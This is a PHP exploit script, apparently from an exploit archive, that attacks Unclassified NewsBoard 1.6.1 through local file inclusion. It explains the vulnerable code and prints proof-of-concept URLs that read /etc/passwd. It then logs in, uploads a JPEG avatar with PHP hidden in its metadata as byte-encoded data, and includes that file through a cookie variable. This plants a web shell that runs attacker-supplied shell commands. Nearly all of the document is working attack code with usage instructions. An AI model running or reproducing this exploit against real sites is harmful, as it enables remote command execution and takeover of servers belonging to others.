@@ -1,0 +1,382 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "Unclassified NewsBoard <= 1.6.1 patch 1 ABBC[Config][smileset] arbitrary\r\n";
+echo "local inclusion\r\n";
+echo "by rgod rgod@autistici.org\r\n";
+echo "site: http://retrogod.altervista.org\r\n\r\n";
+echo "works with register_globals = On & magic_quotes_gpc = Off\r\n\r\n";
+
+/*
+1.5.3 patch level 4 and below, exploit is a bit different, ex:
+ 
+http://[target]/[path]/bb_lib/abbc.css.php?design_path=../../../../../../../../../etc/passwd%00
+*/
+
+if ($argc<6) {
+echo "Usage: php ".$argv[0]." host path user pass cmd OPTIONS\r\n";
+echo "host:      target server (ip/hostname)\r\n";
+echo "path:      path to UNB\r\n";
+echo "cmd:       a shell command\r\n";
+echo "user/pass: you need a valid user account to upload files\r\n";
+echo "Options:\r\n";
+echo "   -p[port]:    specify a port other than 80\r\n";
+echo "   -P[ip:port]: specify a proxy\r\n";
+echo "Examples:\r\n";
+echo "php ".$argv[0]." localhost /unb/ your_username password cat ./../board.conf.php\r\n";
+echo "php ".$argv[0]." localhost /unb/ your_username password ls -la -p81\r\n";
+echo "php ".$argv[0]." localhost / your_username password ls -la -P1.1.1.1:80\r\n\r\n";
+die;
+}
+
+/* software site: http://newsboard.unclassified.de/
+
+   description: "The Unclassified NewsBoard (short UNB) is an open-source,
+   PHP-based internet bulletin board system"
+
+   vulnerable code in unb_lib/abbc.conf.php at lines 635-641:
+
+   ...
+   // Smiley Definitions
+  if ($ABBC['Config']['smileset'])
+  {
+	$ABBC['Config']['smilepath'] = dirname(__FILE__) . '/designs/_smile/' . $ABBC['Config']['smileset'] . '/';
+	$ABBC['Config']['smileurl'] = $UNB['LibraryURL'] . 'designs/_smile/' . $ABBC['Config']['smileset'] . '/';
+	@include($ABBC['Config']['smilepath'] . 'config.php');
+  }
+  ...
+
+  $ABBC['Config']['smileset'] var is not initialized before to be used to include
+  files. You cannot have access to this code directly but in unb_lib/abbc.css.php
+  at line 16 we have:
+
+  ...
+  require('abbc.conf.php');
+  ...
+
+  this script is not protected by the unb_lib folder .htaccess file:
+
+  # Don't allow direct PHP requests in this directory
+  <Files *.inc.php>
+	Order allow,deny
+	Deny from all
+  </Files>
+  <Files *.lib.php>
+	Order allow,deny
+	Deny from all
+  </Files>
+
+  so, if register_globals = On & magic_quotes_gpc = Off, you can include files
+  from local resources, poc:
+
+  http://[target]/[path]/unb_lib/abbc.css.php?ABBC[Config][smileset]=../../../../../../../../../etc/passwd%00
+  http://[target]/[path]/unb_lib/abbc.css.php?ABBC[Config][smileset]=../../upload/avatar_[user_id].jpeg%00&cmd=ls%20-la
+  http://[target]/[path]/unb_lib/abbc.css.php?ABBC[Config][smileset]=../../upload/photo_[user_id].jpeg%00&cmd=ls%20-la
+
+  this script try to include an avatar or photo with malicious php code
+  inside, you need a valid account to upload files
+
+									      */
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+  #debug
+  #echo "\r\n".$html;
+
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$username=$argv[3];
+$pass=$argv[4];
+$cmd="";$port=80;$proxy="";
+for ($i=5; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+$cmd=urlencode($cmd);
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "step 0 -> check if suntzu.php is already installed...\r\n";
+$packet ="GET ".$p."unb_lib/suntzu.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+  echo "Exploit succeeded...";
+  $temp=explode("56789",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+
+echo "step 1 -> login...\r\n";
+$data ="LoginName=".urlencode(trim($username));
+$data.="&LoginPassword=".urlencode(trim($pass));
+$packet="POST ".$p."forum.php?req=setuser&module=main HTTP/1.0\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$temp2=explode(' ',$temp[1]);
+$cookie=$temp2[0];
+$temp2=explode(' ',$temp[2]);
+$cookie.=" ".$temp2[0];
+echo 'Your cookie: '.$cookie."\r\n";
+$temp=explode("=",$cookie);
+$temp2=explode("+",$temp[2]);
+$id=$temp2[0];
+echo "User Id -> ".$id."\r\n";
+
+echo "step 2 -> upload a malicious avatar with php code inside...\r\n";
+$shell=
+chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x07).chr(0x3c).chr(0x3f).
+chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x24).chr(0x66).chr(0x70).
+chr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).chr(0x6e).chr(0x28).chr(0x22).
+chr(0x73).chr(0x75).chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).
+chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).
+chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).
+chr(0x28).chr(0x24).chr(0x66).chr(0x70).chr(0x2c).chr(0x22).chr(0x3c).chr(0x3f).
+chr(0x70).chr(0x68).chr(0x70).chr(0x20).chr(0x65).chr(0x72).chr(0x72).chr(0x6f).
+chr(0x72).chr(0x5f).chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).chr(0x74).
+chr(0x69).chr(0x6e).chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).chr(0x73).
+chr(0x65).chr(0x74).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5f).
+chr(0x6c).chr(0x69).chr(0x6d).chr(0x69).chr(0x74).chr(0x28).chr(0x30).chr(0x29).
+chr(0x3b).chr(0x69).chr(0x66).chr(0x20).chr(0x28).chr(0x67).chr(0x65).chr(0x74).
+chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).chr(0x69).chr(0x63).chr(0x5f).chr(0x71).
+chr(0x75).chr(0x6f).chr(0x74).chr(0x65).chr(0x73).chr(0x5f).chr(0x67).chr(0x70).
+chr(0x63).chr(0x28).chr(0x29).chr(0x29).chr(0x20).chr(0x7b).chr(0x5c).chr(0x24).
+chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).
+chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x3d).chr(0x73).chr(0x74).chr(0x72).
+chr(0x69).chr(0x70).chr(0x73).chr(0x6c).chr(0x61).chr(0x73).chr(0x68).chr(0x65).
+chr(0x73).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).
+chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).
+chr(0x29).chr(0x3b).chr(0x7d).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).
+chr(0x35).chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x3b).chr(0x70).chr(0x61).
+chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).
+chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).
+chr(0x5b).chr(0x63).chr(0x6d).chr(0x64).chr(0x5d).chr(0x29).chr(0x3b).chr(0x65).
+chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x35).chr(0x36).chr(0x37).chr(0x38).
+chr(0x39).chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x29).chr(0x3b).chr(0x0d).
+chr(0x0a).chr(0x66).chr(0x63).chr(0x6c).chr(0x6f).chr(0x73).chr(0x65).chr(0x28).
+chr(0x24).chr(0x66).chr(0x70).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).
+chr(0x68).chr(0x6d).chr(0x6f).chr(0x64).chr(0x28).chr(0x22).chr(0x73).chr(0x75).
+chr(0x6e).chr(0x74).chr(0x7a).chr(0x75).chr(0x2e).chr(0x70).chr(0x68).chr(0x70).
+chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).chr(0x3b).chr(0x0d).
+chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
+chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
+chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
+chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
+chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
+chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
+chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x08).
+chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
+chr(0x00).chr(0x15).chr(0x01).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x08).chr(0x09).chr(0xff).chr(0xc4).chr(0x00).
+chr(0x14).chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).
+chr(0x01).chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).
+chr(0x00).chr(0x23).chr(0x94).chr(0x09).chr(0x2e).chr(0xff).chr(0xd9).chr(0x00);
+
+/*
+this image has this code inside as EXIF metadata content
+<?php
+$fp=fopen("suntzu.php","w");
+fputs($fp,"<?php error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()) {\$_COOKIE[cmd]=stripslashes(\$_COOKIE[cmd]);}echo 56789;passthru(\$_COOKIE[cmd]);echo 56789;?>");
+fclose($fp);
+chmod("suntzu.php",777);
+?>
+*/
+
+$data='-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="action"
+
+edit
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="id"
+
+'.$id.'
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="cat"
+
+postoptions
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="Signature"
+
+
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="avatar"
+
+1
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="avatarfile"; filename="suntzu.jpeg"
+Content-Type: image/pjpeg
+
+'.$shell.'
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="avatarurl"
+
+
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="photofile"; filename="suntzoi.jpeg"
+Content-Type: image/pjpeg
+
+'.$shell.'
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="photourl"
+
+
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="photo"
+
+1
+-----------------------------7d614f2d12043e
+Content-Disposition: form-data; name="Save"
+
+Save
+-----------------------------7d614f2d12043e--
+';
+
+$packet ="POST ".$p."forum.php?req=cp HTTP/1.0\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d614f2d12043e\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Keep-Alive\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: ".$cookie."\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+
+echo "step 3 -> try to include avatar or photo...\r\n";
+$xpl=array(
+	   urlencode("../../upload/avatar_".$id.".jpeg".chr(0x00)),
+	   urlencode("../../upload/photo_".$id.".jpeg".chr(0x00))
+	  );
+
+for ($i=0; $i<=count($xpl)-1; $i++)
+{
+  $packet ="GET ".$p."unb_lib/abbc.css.php HTTP/1.0\r\n";
+  $packet.="Host: ".$host."\r\n";
+  $packet.="Cookie: ABBC[Config][smileset]=".$xpl[$i]."; \r\n"; //pass evil var through cookies
+  $packet.="Connection: Close\r\n\r\n";
+  $packet.=$data;
+  #debug
+  #echo quick_dump($packet);
+  sendpacketii($packet);
+}
+
+echo "step 4 -> Launch commands...\r\n";
+$packet ="GET ".$p."unb_lib/suntzu.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Cookie: cmd=".$cmd.";\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+#debug
+#echo quick_dump($packet);
+sendpacketii($packet);
+if (strstr($html,"56789"))
+{
+  echo "Exploit succeeded...";
+  $temp=explode("56789",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+//if you are here...
+echo "Exploit failed...";
+?>
+
+# milw0rm.com [2006-05-11]
